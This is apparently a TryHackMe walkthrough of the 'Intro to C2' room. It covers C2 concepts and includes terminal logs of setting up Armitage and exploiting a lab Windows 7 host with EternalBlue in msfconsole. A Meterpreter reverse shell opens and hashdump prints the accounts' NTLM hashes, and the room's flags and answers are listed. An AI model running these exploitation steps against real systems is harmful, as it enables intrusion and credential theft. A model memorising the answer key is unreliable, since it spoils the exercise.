---
title: Intro to C2
author: CYB3RM3
name: CYB3RM3 | Intro to C2
date: 2022-05-07 13:40:52 +0100
categories: [TryHackMe, Red Team Fundamentals]
tags: [Red Team, C2, Engagement]
---

Learn the essentials of Command and Control to help you become a better Red Teamer and simplify your next Red Team assessment!

THM Room [https://tryhackme.com/room/introtoc2](https://tryhackme.com/room/introtoc2)


## TASK 1 : Introduction
### Read the task above! 
No Answer

## TASK 2 : Command and Control Framework Structure
### What is the component's name that lives on the victim machine that calls back to the C2 server? 
Answer : agent

### What is the beaconing option that introduces a random delay value to the sleep timer?
Answer : jitter

### What is the term for the first portion of a Staged payload?
Answer : dropper

### What is the name of the communication method that can potentially allow access to a restricted network segment that communicates via TCP ports 139 and 445?
Answer : SMB Beacon

## TASK 3 : Common C2 Frameworks

### Learn about some common C2 Frameworks that are out in the wild!

![Armitage C2](/images/thm/introtoc2/introtoc2_1.png)
_Armitage C2_

Example : Armitage C2

No Answer 

## TASK 4 : Setting Up a C2 Framework
### Read the task, set up Armitage, and explore the User Interface. 
No Answer.

## TASK 5 : C2 Operation Basics
### Which listener should you choose if you have a device that cannot easily access the internet? 
Answer : DNS

### Which listener should you choose if you're accessing a restricted network segment?
Answer : SMB

### Which listener should you choose if you are dealing with a Firewall that does protocol inspection?
Answer : HTTPS

## TASK 6 : Command, Control, and Conquer
### What flag can be found after gaining Administrative access to the PC? 
First, setting up armitage :

```console
root@ip-10-10-195-117:/opt/armitage/release/unix# systemctl start postgresql && systemctl status postgresql
\u25cf postgresql.service - PostgreSQL RDBMS
   Loaded: loaded (/lib/systemd/system/postgresql.service; enabled; vendor preset: enabled)
   Active: active (exited) since Sat 2022-05-07 09:48:13 BST; 15min ago
  Process: 1518 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
 Main PID: 1518 (code=exited, status=0/SUCCESS)

May 07 09:48:13 ip-10-10-195-117 systemd[1]: Starting PostgreSQL RDBMS...
May 07 09:48:13 ip-10-10-195-117 systemd[1]: Started PostgreSQL RDBMS.
```
{: .nolineno }

Then in 2d terminal :

```console
root@ip-10-10-195-117:/opt/armitage/release/unix# su ubuntu
ubuntu@ip-10-10-195-117:/opt/armitage/release/unix$ msfdb --use-defaults delete
No data at /home/ubuntu/.msf4/db, doing nothing
MSF web service is no longer running
ubuntu@ip-10-10-195-117:/opt/armitage/release/unix$ msfdb --use-defaults init
Creating database at /home/ubuntu/.msf4/db
Starting database at /home/ubuntu/.msf4/db...success
Creating database users
Writing client authentication configuration file /home/ubuntu/.msf4/db/pg_hba.conf
Stopping database at /home/ubuntu/.msf4/db
Starting database at /home/ubuntu/.msf4/db...success
Creating initial database schema
Generating SSL key and certificate for MSF web service
Attempting to start MSF web service...failed
[!] MSF web service does not appear to be started.
Please see /home/ubuntu/.msf4/logs/msf-ws.log for additional details.
ubuntu@ip-10-10-195-117:/opt/armitage/release/unix$
```
{: .nolineno }

3rd terminal :

```console
root@ip-10-10-195-117:/opt/armitage/release/unix# ./teamserver 10.10.195.117 P@ssw0rd123
[*] Generating X509 certificate and keystore (for SSL)
[*] Starting RPC daemon
[*] MSGRPC starting on 127.0.0.1:55554 (NO SSL):Msg...
[*] MSGRPC backgrounding at 2022-05-07 10:08:30 +0100...
[*] MSGRPC background PID 4566
[*] sleeping for 20s (to let msfrpcd initialize)
[*] Starting Armitage team server
WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by org.postgresql.jdbc.TimestampUtils (file:/opt/armitage/release/unix/armitage.jar) to field java.util.TimeZone.defaultTimeZone
WARNING: Please consider reporting this to the maintainers of org.postgresql.jdbc.TimestampUtils
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release
[*] Use the following connection details to connect your clients:
	Host: 10.10.195.117
	Port: 55553
	User: msf
	Pass: P@ssw0rd123

[*] Fingerprint (check for this string when you connect):
	203c76b510fae3ad80500789e2d80126f8110ba7
[+] multi-player metasploit... ready to go
```
{: .nolineno }

Finnaly, operate in Armitage GUI :

![Armitage C2](/images/thm/introtoc2/introtoc2_2.png)
_Armitage C2_

Scan on the target :

![Armitage scan](/images/thm/introtoc2/introtoc2_3.png)
_Armitage scan_

Using eternalblue exploit :

![Armitage exploit](/images/thm/introtoc2/introtoc2_4.png)
_Armitage exploit_

![Armitage exploit 2](/images/thm/introtoc2/introtoc2_5.png)
_Armitage exploit 2_

Then connect to the target :

![Armitage exploit 3](/images/thm/introtoc2/introtoc2_6.png)
_Armitage exploit 3_

Found the root.txt flag on the administrator's Desktop :

![Root Flag](/images/thm/introtoc2/introtoc2_7.png)
_Root Flag_

![Root Flag](/images/thm/introtoc2/introtoc2_8.png)
_Root Flag_

Answer : THM{bd6ea6c871dced619876321081132744}

### What is the Administrator's NTLM hash?

Armitage meterpreter goes wrong on my side, so i just gone through the classic msfconsole command line interface :


```console
root@ip-10-10-195-117:/opt/armitage/release/unix# msfconsole
                                                  
                                              `:oDFo:`                            
                                           ./ymM0dayMmy/.                          
                                        -+dHJ5aGFyZGVyIQ==+-                    
                                    `:sm\u23e3~~Destroy.No.Data~~s:`                
                                 -+h2~~Maintain.No.Persistence~~h+-              
                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          
                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.      
                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    
                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  
                      :dopeAW.No<nano>o                     :is:T\u042fiKC.sudo-.A:  
                      :we're.all.alike'`                     The.PFYroy.No.D7:  
                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    
                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:    
                      :---srwxrwx:-.`                        `MS146.52.No.Per:    
                      :<script>.Ac816/                        sENbove3101.404:    
                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    
                      :09.14.2011.raid                       /STFU|wall.No.Pr:    
                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    
                      :#OUTHOUSE-  -s:                       /corykennedyData:    
                      :$nmap -oS                              SSo.6178306Ence:    
                      :Awsm.da:                            /shMTl#beats3o.No.:    
                      :Ring0:                             `dDestRoyREXKC3ta/M:    
                      :23d:                               sSETEC.ASTRONOMYist:    
                       /-                        /yo-    .ence.N:(){ :|: & };:    
                                                 `:Shall.We.Play.A.Game?tron/    
                                                 ```-ooy.if1ghtf0r+ehUser5`    
                                               ..th3.H1V3.U2VjRFNN.jMh+.`          
                                              `MjM~~WE.ARE.se~~MMjMs              
                                               +~KANSAS.CITY's~-`                  
                                                J~HAKCERS~./.`                    
                                                .esc:wq!:`                        
                                                 +++ATH`                            
                                                  `


       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: You can use help to view all available commands

msf5 > search eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index, for example use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf5 > use 2
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhost 10.10.0.169
rhost => 10.10.0.169
msf5 exploit(windows/smb/ms17_010_eternalblue) > set lport 8888

msf5 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.195.117:8888 
[*] 10.10.0.169:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.0.169:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7600 x64 (64-bit)
[*] 10.10.0.169:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.0.169:445 - Connecting to target for exploitation.
[+] 10.10.0.169:445 - Connection established for exploitation.
[+] 10.10.0.169:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.0.169:445 - CORE raw buffer dump (25 bytes)
[*] 10.10.0.169:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 48 6f 6d 65 20 42  Windows 7 Home B
[*] 10.10.0.169:445 - 0x00000010  61 73 69 63 20 37 36 30 30                       asic 7600       
[+] 10.10.0.169:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.0.169:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.0.169:445 - Sending all but last fragment of exploit packet
[*] 10.10.0.169:445 - Starting non-paged pool grooming
[+] 10.10.0.169:445 - Sending SMBv2 buffers
[+] 10.10.0.169:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.0.169:445 - Sending final SMBv2 buffers.
[*] 10.10.0.169:445 - Sending last fragment of exploit packet!
[*] 10.10.0.169:445 - Receiving response from exploit packet
[+] 10.10.0.169:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.0.169:445 - Sending egg to corrupted connection.
[*] 10.10.0.169:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.0.169
[*] Meterpreter session 1 opened (10.10.195.117:8888 -> 10.10.0.169:49251) at 2022-05-07 12:34:32 +0100
[+] 10.10.0.169:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.0.169:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.0.169:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c156d5d108721c5626a6a054d6e0943c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Ted:1001:aad3b435b51404eeaad3b435b51404ee:2e2618f266da8867e5664425c1309a5c:::
meterpreter >
```
{: .nolineno }


Answer : c156d5d108721c5626a6a054d6e0943c

### What flag can be found after gaining access to Ted's user account?

Using previous access, changed from administrator to Ted's desktop :

![Flag](/images/thm/introtoc2/introtoc2_9.png)
_Flag_

Answer : THM{217fa45e35f8353ffd04cfc0be28e760}

### What is Ted's NTLM Hash?

Answer :  2e2618f266da8867e5664425c1309a5c

## TASK 7 : Advanced C2 Setups

### What setting name that allows you to modify the User Agent field in a Meterpreter payload? 

![HttpUserAgent](/images/thm/introtoc2/introtoc2_10.png)
_HttpUserAgent_

Answer : HttpUserAgent

### What setting name that allows you to modify the Host header in a Meterpreter payload?

Checking the options available for our payload in msfvenom :

![HttpHostHeader](/images/thm/introtoc2/introtoc2_11.png)
_HttpHostHeader_

Answer : HttpHostHeader

## TASK 8 : Wrapping Up 
### Read the closing task. 

No Answer.